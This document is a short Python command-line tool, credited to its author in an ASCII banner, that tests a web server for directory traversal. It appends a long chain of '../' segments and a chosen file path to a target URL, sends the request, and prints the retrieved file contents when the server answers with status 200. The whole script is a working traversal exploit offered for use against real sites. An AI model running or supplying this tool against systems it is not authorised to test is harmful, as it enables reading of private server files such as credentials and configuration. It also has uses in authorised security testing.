import requests
import argparse
import time

def banner():
    print('''

   /=\                             /=\ |           |
    |  /= /=| | | /=\ /= /== /=\   |   |=\ /=\ /=: =/
    |  |  \=| \\/  \=  |  ==/ \=    \=/ | | \=  \=: |\\
 ''')
    print("################################################\nAuthor: Usman Q Khan\n")

banner()
parser = argparse.ArgumentParser(description="Check for Directory Traversal vulnerability", usage='python3 %(prog)s -u URL -p PATH')
parser.add_argument("-u", "--url", required=True, help="Enter a URL", type=str)
parser.add_argument("-p", "--path", required=True, help="Enter the full path of the file you'd like to find", type=str)

args = parser.parse_args()



payload = '../../../../../../../../../../../../../'
url = args.url + payload + args.path
print("[*]Building payload....[*]\n")
time.sleep(1)
print(url)
print("\n[*]Checking for directory traversal.....[*]\n")
s = requests.Session()

r = s.get(url)
if (r.status_code == 200):
    print("[*]Directory traversal successful![*]\n")
    print(r.text)
    print(r.content)
else:
    print("This webpage is not vulnerable to a directory traversal attack")

